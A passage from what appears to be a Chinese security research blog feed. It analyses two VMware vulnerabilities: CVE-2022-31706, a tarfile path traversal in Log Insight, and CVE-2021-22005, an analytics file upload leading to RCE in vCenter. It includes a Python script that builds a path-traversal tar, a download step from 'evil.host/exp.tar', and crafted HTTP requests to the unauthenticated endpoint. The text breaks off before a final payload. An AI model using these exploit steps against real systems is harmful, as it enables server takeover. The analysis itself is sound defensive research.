第三方库的目录穿越漏洞。简单总结：CVE-2022-31706 漏洞的本质是loginsight-pak-upgrade.py直接调用tarfile库的extractall&#x2F;extract方法提取文件而未进行过滤操作，该库曾爆出过<a href="https://nvd.nist.gov/vuln/detail/CVE-2007-4559">CVE-2007-4559</a>漏洞：未对文件名中的..&#x2F;进行安全限制导致提权tar文件时可以目录遍历、文件覆盖。CVE-2022-31706漏洞正是利用了此”特性”最终导致攻击者可以覆盖、创建webshell或Linux cron计划任务以获取系统权限</p><p>跟下loginsight-pak-upgrade.py代码逻辑：脚本根据程序传入的–eula参数决定是进入“license操作”（圈1）还是进入”执行升级”操作（圈2、圈3）。在“license操作”流程中，系统只提取pak中的.mf .cert .txt文件。而在”执行升级”流程中，会提取pak中包含的所有文件，后者符合我们对于漏洞利用的预期</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/26.png"></p><p>触发点在&#x2F;application&#x2F;sbin&#x2F;loginsight-pak-upgrade.py:378#extractFiles</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/27.png"></p><p>而想要调用到extractall方法需要满足如下4个条件，第一个可以通过rpc调用方法时设置eulaOnly参数来控制，而后面3个都是对pak文件的格式要求</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span>、mode != MODE<span class="hljs-selector-class">.LICENSE</span><br><span class="hljs-number">2</span>、传入的pak包文件要求：<span class="hljs-built_in">integrityCheck</span>()<br><span class="hljs-number">3</span>、传入得证书、签名可通过校验：<span class="hljs-built_in">verifyCertificate</span>()、<span class="hljs-built_in">validateSignature</span>()、<br><span class="hljs-number">4</span>、传入得mf文件通过校验：manifest<span class="hljs-selector-class">.checkSupportVersion</span>()、manifest<span class="hljs-selector-class">.checkDiskSpace</span>() <br></code></pre></td></tr></table></figure><p>依次分析下条件，&#x2F;application&#x2F;sbin&#x2F;loginsight-pak-upgrade.py:integrityCheck()对传入pak中得文件进行校验，需要pak包中包含VMware-vRealize-Log-Insight.mf、VMware-vRealize-Log-Insight.cert、upgrade-driver、eula.txt、*.rpm文件。挨个对照格式制作文件比较复杂，我在官网直接下载了VMware-vRealize-Log-Insight-8.10.2-21145187.pak，里面得文件就可以满足上面的3个条件</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/28.png"></p><p>在系统中中随意找了比较小的rpm文件，大小为100k 传输起来方便一些，这样5个必需的文件都准备好了</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/29.png"></p><p>使用tarfile库制作一个evil tar文件，data是最终写入的文件内容，gen.filename是最终要覆盖的路径信息。运行后会生成exp.tar文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#genTar.py</span><br><span class="hljs-keyword">import</span> tarfile<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GenTarFileTest</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.filename = <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">change_name</span>(<span class="hljs-params">self, tarinfo</span>):<br>        tarinfo.name = self.filename<br>        <span class="hljs-keyword">return</span> tarinfo<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, name</span>):<br>        <span class="hljs-keyword">with</span> tarfile.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;exp.tar&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> tar:<br>            tar.add(name, <span class="hljs-built_in">filter</span>=self.change_name)<br>            tar.add(<span class="hljs-string">&quot;VMware-vRealize-Log-Insight.cert&quot;</span>)<br>            tar.add(<span class="hljs-string">&quot;VMware-vRealize-Log-Insight.mf&quot;</span>)<br>            tar.add(<span class="hljs-string">&quot;kexec-tools-2.0.3-0.15.18.x86_64.rpm&quot;</span>)<br>            tar.add(<span class="hljs-string">&quot;upgrade-driver&quot;</span>)<br>            tar.add(<span class="hljs-string">&quot;eula.txt&quot;</span>)<br><br>FilePath = <span class="hljs-string">&quot;/xxx/xxx&quot;</span><br>gen = GenTarFileTest()<br>gen.filename = <span class="hljs-string">&quot;../../../../&quot;</span>+FilePath<br>gen.compress(<span class="hljs-string">&quot;data&quot;</span>)<br><br><br><span class="hljs-comment">#data</span><br>xxx<br></code></pre></td></tr></table></figure><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/30.png"></p><p>然后使用上面提到的rpc方法RemotePakDownloadCommand（地址为evil.host&#x2F;exp.tar）、pakUpgradeCommand方法(设置eulaOnly、fileName参数)即可完成利用</p><p>jsp文件位置，懂：</p><p><img src="/img/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/31.png"></p><p><strong>纪念与好兄弟蜗牛哥一起熬夜肝洞的夜晚</strong></p><h2 id="5、文章参考"><a href="#5、文章参考" class="headerlink" title="5、文章参考"></a>5、文章参考</h2><p><a href="https://www.vmware.com/security/advisories/VMSA-2023-0001.html">https://www.vmware.com/security/advisories/VMSA-2023-0001.html</a></p><p><a href="https://thrift.apache.org/tutorial/java.html">https://thrift.apache.org/tutorial/java.html</a></p><p><a href="https://www.trellix.com/en-us/about/newsroom/stories/research/tarfile-exploiting-the-world.html">https://www.trellix.com/en-us/about/newsroom/stories/research/tarfile-exploiting-the-world.html</a></p><p><a href="https://www.horizon3.ai/vmware-vrealize-cve-2022-31706-iocs/">https://www.horizon3.ai/vmware-vrealize-cve-2022-31706-iocs/</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞追踪</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
      <tag>CVE</tag>
      
      <tag>VMware-vRealize-Log-Insight</tag>
      
      <tag>tarfile</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vmware-Vcenter漏洞追踪之CVE-2021-22005</title>
    <link href="/2022/Research-Vmware-Vcenter&#39;s-vulnerability-CVE-2021-22005/"/>
    <url>/2022/Research-Vmware-Vcenter&#39;s-vulnerability-CVE-2021-22005/</url>
    
    <content type="html"><![CDATA[<blockquote><p>在CVE-2021-22005 刚爆出来时，testbnull师傅分析了漏洞的前半部分，但是没有给出最后的RCE方法。由于自己之前也分析过Vcenter的其他几个洞，所以当时就花了些时间看了下，最终使用getAppender()拿到变量成功完成了RCE EXP的构造。而后圈子里对该漏洞的关注度小了很多，也有些师傅陆陆续续公开了POC&#x2F;EXP，索性就将我当时调试情况及后来的补充分析整理成文一并发出来。当时分析完后感觉，如果单纯通过审计能挖出来这洞真的太强了，而使用收集流量数据+审计代码去构造数据包 难度应该会小很多。在测试过程当中断点收到了系统发的请求流量，根据这些也可以很快定位到最终的resourceItemToJsonLdMapping对象进行模板注入</p></blockquote><p><strong>PS：本文仅用于技术讨论。严禁用于任何非法用途，违者后果自负。</strong></p><h2 id="1、环境调试"><a href="#1、环境调试" class="headerlink" title="1、环境调试"></a>1、环境调试</h2><blockquote><p>复现版本：VMware VirtualCenter 6.7.0 build-17028632  linux平台 </p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>vmware<span class="hljs-regexp">/vmware-vmon/</span>svcCfgfiles/analytics.json<br><span class="hljs-string">&quot;-Xdebug -Xnoagent -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5006&quot;</span>,<br></code></pre></td></tr></table></figure><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/1.png">  </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css">重启服务<br>service-control <span class="hljs-attr">--restart</span> vmware-analytics<br><br>开启防火墙<br>iptables -<span class="hljs-selector-tag">I</span> OUTPUT -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">5006</span> -j ACCEPT<br>iptables -<span class="hljs-selector-tag">I</span> <span class="hljs-selector-tag">INPUT</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">5006</span> -j ACCEPT<br></code></pre></td></tr></table></figure><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/2.png">  </p><p>成功断点调试：<br><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/3.png">  </p><p>如果不行就直接上命令开启调试：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>java<span class="hljs-regexp">/jre-vmware/</span>bin<span class="hljs-regexp">/vmware-analytics.launcher -Xmx128m -XX:CompressedClassSpaceSize=64m -Xss256k -XX:ParallelGCThreads=1 -Xdebug -Xnoagent -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=9999 -Dorg.apache.catalina.startup.EXIT_ON_INIT_FAILURE=TRUE -Danalytics.logDir=/</span>var<span class="hljs-regexp">/log/</span>vmware<span class="hljs-regexp">/analytics -Danalytics.dataDir=/</span>storage<span class="hljs-regexp">/analytics -Danalytics.deploymentNodeTypeFile=/</span>etc<span class="hljs-regexp">/vmware/</span>deployment.node.type -Danalytics.buildInfoFile=<span class="hljs-regexp">/etc/</span>vmware<span class="hljs-regexp">/.buildInfo -Danalytics.agentsDir=/</span>etc<span class="hljs-regexp">/vmware-analytics/</span>agents -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/vmware/</span>analytics -XX:ErrorFile=<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/vmware/</span>analytics<span class="hljs-regexp">/java_error.log -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintReferenceGC -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=10 -XX:GCLogFileSize=1024K -Xloggc:/</span>var<span class="hljs-regexp">/log/</span>vmware<span class="hljs-regexp">/analytics/</span>vmware-analytics-gc.log -Djava.security.properties=<span class="hljs-regexp">/etc/</span>vmware<span class="hljs-regexp">/java/</span>vmware-override-java.security -Djava.ext.dirs=<span class="hljs-regexp">/usr/</span>java<span class="hljs-regexp">/jre-vmware/</span>lib<span class="hljs-regexp">/ext:/u</span>sr<span class="hljs-regexp">/java/</span>packages<span class="hljs-regexp">/lib/</span>ext:<span class="hljs-regexp">/opt/</span>vmware<span class="hljs-regexp">/jre_ext/</span> -classpath <span class="hljs-regexp">/etc/</span>vmware-analytics:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware-analytics/</span>lib<span class="hljs-regexp">/*:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware-analytics<span class="hljs-regexp">/lib:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>tomcat-embed-core-<span class="hljs-number">8.5</span>.<span class="hljs-number">56</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/tomcat-annotations-api-8.5.56.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>antlr-<span class="hljs-number">2.7</span>.<span class="hljs-number">7</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/antlr-runtime.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>aspectjrt.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/bcprov-jdk16-145.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>commons-codec-<span class="hljs-number">1.6</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/commons-collections-3.2.2.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>commons-collections4-<span class="hljs-number">4.1</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/commons-compress-1.8.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>commons-io-<span class="hljs-number">2.1</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/commons-lang-2.6.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>commons-lang3-<span class="hljs-number">3.4</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/commons-logging-1.1.3.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>commons-pool-<span class="hljs-number">1.6</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/custom-rolling-file-appender-1.0.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>featureStateSwitch-<span class="hljs-number">1.0</span>.<span class="hljs-number">0</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/guava-18.0.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>httpasyncclient-<span class="hljs-number">4.1</span>.<span class="hljs-number">3</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/httpclient-4.5.3.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>httpcore-<span class="hljs-number">4.4</span>.<span class="hljs-number">6</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/httpcore-nio-4.4.6.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>httpmime-<span class="hljs-number">4.5</span>.<span class="hljs-number">3</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/jackson-annotations-2.10.4.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>jackson-core-<span class="hljs-number">2.10</span>.<span class="hljs-number">4</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/jackson-databind-2.10.4.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>jna.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/log4j-1.2.16.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>log4j-core-<span class="hljs-number">2.8</span>.<span class="hljs-number">2</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/log4j-api-2.8.2.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>platform.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/slf4j-api-1.7.30.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>slf4j-log4j12-<span class="hljs-number">1.7</span>.<span class="hljs-number">30</span>.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/spring-aop-4.3.27.RELEASE.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>spring-beans-<span class="hljs-number">4.3</span>.<span class="hljs-number">27</span>.RELEASE.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/spring-context-4.3.27.RELEASE.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>spring-core-<span class="hljs-number">4.3</span>.<span class="hljs-number">27</span>.RELEASE.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/spring-expression-4.3.27.RELEASE.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>spring-web-<span class="hljs-number">4.3</span>.<span class="hljs-number">27</span>.RELEASE.jar:<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/spring-webmvc-4.3.27.RELEASE.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>velocity-<span class="hljs-number">1.7</span>.jar com.vmware.ph.phservice.service.Main ph-properties-loader.xml ph-featurestate.xml phservice.xml ph-web.xml<br></code></pre></td></tr></table></figure><h2 id="2、补丁分析"><a href="#2、补丁分析" class="headerlink" title="2、补丁分析"></a>2、补丁分析</h2><p>vmware在9月24日发布了<a href="https://www.vmware.com/security/advisories/VMSA-2021-0020.html">安全通告</a>，修复了vcenter的多个漏洞，其中CVE-2021-22005 任意文件上传获得严重漏洞 9.8评分，通过描述看到，攻击者可以未授权请求443端口上传文件。且此漏洞并不影响vcenter 6.5 </p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/4.png"></p><p>可以看到漏洞关键字：Analytics service、443端口访问、文件上传执行命令、不影响6.5</p><p>补丁文章：<a href="https://kb.vmware.com/s/article/85717">https://kb.vmware.com/s/article/85717</a></p><p>对比代码：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6</span>.<span class="hljs-number">7</span>\<span class="hljs-number">17028579</span>\vmware-analytics<br><span class="hljs-attribute">6</span>.<span class="hljs-number">7</span>\<span class="hljs-number">18485185</span>-new\vmware-analytics<br></code></pre></td></tr></table></figure><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/5.png"></p><p><code>analytics-cloud-dataapp-server-6.7.0.jar\com\vmware\ph\phservice\cloud\dataapp\server\DataAppAgentController.class</code></p><p>删除了DataAppAgentController.class的collect()方法</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/6.png"></p><p>查看存在漏洞的版本代码：</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/7.png"></p><p>另外补丁还在实例化DataAppAgentId类时，使用isValidCollectorId及isValidCollectorInstanceId检查传入的collectorId及collectorInstanceId是否符合要求</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/8.png"></p><p>com.vmware.ph.phservice.common.internal.IdFormatUtil</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/9.png"></p><p>使用<code>java.util.regex.Pattern</code>对字符串进行正则匹配，不符合要求则无法实例化DataAppAgentId对象；</p><p>另外一段变化代码，发生在<code>analytics-push-telemetry-server-6.7.0.jar\com\vmware\ph\phservice\push\telemetry\server\AsyncTelemetryController.class</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/10.png"></p><p>变化点：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">vmware-analytics\lib\sources\<span class="hljs-keyword">com</span>\vmware\ph\phservice\<span class="hljs-keyword">push</span>\telemetry\server\AsyncTelemetryController<span class="hljs-meta">#handleSendRequest()</span><br><br><span class="hljs-symbol">collectorInstanceId:</span><br>IdFormatUtil.isValidCollectorInstanceId(collectorInstanceId)  正则限制<br><br><span class="hljs-symbol">collectorId:</span><br>_collectorIdWhitelist.contains(collectorId)  白名单限制<br></code></pre></td></tr></table></figure><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/11.png"></p><p>该漏洞的临时解决方案：</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/12.png"></p><p>本文对<code>/analytics/ph/api/dataapp/agent?action=collect</code>漏洞部分进行分析，查看rhttpproxy代理关于analytics服务的路由(<code>/etc/vmware-rhttpproxy/endpoints.conf.d/analytics-proxy.conf</code>)：</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/13.png"></p><p>允许&#x2F;analytics访问。其实经过测试版本vmware vcenter 6.7并不需要使用..;去访问漏洞接口的</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/14.png"></p><h2 id="3、命令执行-数据构造"><a href="#3、命令执行-数据构造" class="headerlink" title="3、命令执行 数据构造"></a>3、命令执行 数据构造</h2><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/15.png"></p><h3 id="3-1-创建agent"><a href="#3-1-创建agent" class="headerlink" title="3.1 创建agent"></a>3.1 创建agent</h3><p>补丁删除的漏洞方法是：analytics-cloud-dataapp-server-6.7.0.jar\com\vmware\ph\phservice\cloud\dataapp\server\DataAppAgentController.class#collect()</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/16.png"></p><p>构造基础数据包测试</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">POST <span class="hljs-regexp">/analytics/</span>ph<span class="hljs-regexp">/api/</span>dataapp<span class="hljs-regexp">/agent?action=collect&amp;_c=abc&amp;_i=test HTTP/</span><span class="hljs-number">1.1</span><br>...<br>Content-Type: application/json<br>X-Deployment-Secret: abc<br>Content-Length: <span class="hljs-number">65</span><br><br>&#123;<span class="hljs-string">&quot;manifestContent&quot;</span>: <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;contextData&quot;</span>: <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;objectId&quot;</span>: <span class="hljs-string">&quot;c&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>122行会去调用<code>com.vmware.ph.phservice.cloud.dataapp.DefaultDataAppAgentManager#getAgent</code>获取agent</p><blockquote><p>系统会去&#x2F;etc&#x2F;vmware-analytics&#x2F;agents寻找 parameter[_c]+ header[X-Plugin-Type] + “.properties” 文件，这里我们未传入请求头X-Plugin-Type，所以会去寻找&#x2F;etc&#x2F;vmware-analytics&#x2F;agents&#x2F;abc.properties文件</p></blockquote><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/17.png"></p><p>com.vmware.ph.phservice.cloud.dataapp.repository.FileSystemAgentRepository#get()</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/18.png"></p><p>但是<code>/etc/vmware-analytics/agents/abc.properties</code>并不存在，所以会直接报“Did not find agent matching the provided parameters.”的错误</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/19.png"></p><p>我们可以使用系统自带的vsphere_health.properties，但是为了多个版本的适配，我们最好选择使用<code>com.vmware.ph.phservice.cloud.dataapp.server.DataAppAgentController#create()</code>去创建一个</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/20.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/21.png"></p><p>构造数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/analytics/ph/api/dataapp/agent?_c=abc&amp;_i=test</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.232.196<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">X-Deployment-Secret</span><span class="hljs-punctuation">: </span>abc<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>249<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;manifestSpec&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;objectType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;collectionTriggerDataNeeded&quot;</span><span class="hljs-punctuation">:</span>  <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;deploymentDataNeeded&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;resultNeeded&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;signalCollectionCompleted&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;localManifestPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;localPayloadPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;localObfuscationMapPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/22.png"></p><p>成功创建abc.properties，然后再调用collect请求就正常了</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/23.png"></p><p>网上对该漏洞的绝大多数分析文章都是直接跳到velocity模板注入部分，并没有讲述如何从0去构建一个EXP，我们还是一步一步来构造下。开始执行collect()操作的是在<code>com.vmware.ph.phservice.cloud.dataapp.internal.collector.DefaultCollectorDataAppAgent#collect()</code>. EXP分几个关键部分去讲解，依次是：创建agent、XML数据构造、Velocity模板注入</p><h3 id="3-2-XML数据构造"><a href="#3-2-XML数据构造" class="headerlink" title="3.2 XML数据构造"></a>3.2 XML数据构造</h3><p>解析XML调用栈：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs axapta">com.vmware.ph.phservice.cloud.dataapp.<span class="hljs-keyword">server</span>.DataAppAgentController<span class="hljs-meta">#collect </span><br>    collectedData = ((CollectorDataAppAgent)agent).collect(manifestContent, objectId, jsonLdContextData); <span class="hljs-comment">//方法参数由POST传入</span><br>com.vmware.ph.phservice.cloud.dataapp.<span class="hljs-keyword">internal</span>.collector.DefaultCollectorDataAppAgent<span class="hljs-meta">#collect  </span><br>    List&lt;CollectionSpec&gt; collectionSpecs = <span class="hljs-keyword">this</span>.createCollectionSpecs(<span class="hljs-keyword">this</span>._dataApp, objectIdToContextData, CollectionTriggerType.ON_DEMAND, inMemoryManifestContentProvider, inMemoryUploadStrategy, <span class="hljs-literal">true</span>);<br>    Collector collector = <span class="hljs-keyword">this</span>.createCollector(collectionSpecs, (CollectionSchedule)<span class="hljs-literal">null</span>, CollectionTriggerType.ON_DEMAND);<br><br>    outcome = collector.collect();<br></code></pre></td></tr></table></figure><p>着重对<code>collector.collect()</code>进行分析，实际完成操作的是在：com.vmware.ph.phservice.collector.internal.core.ConnectionClosingCollectorWrapper#collect()中</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/24.png"></p><p><img 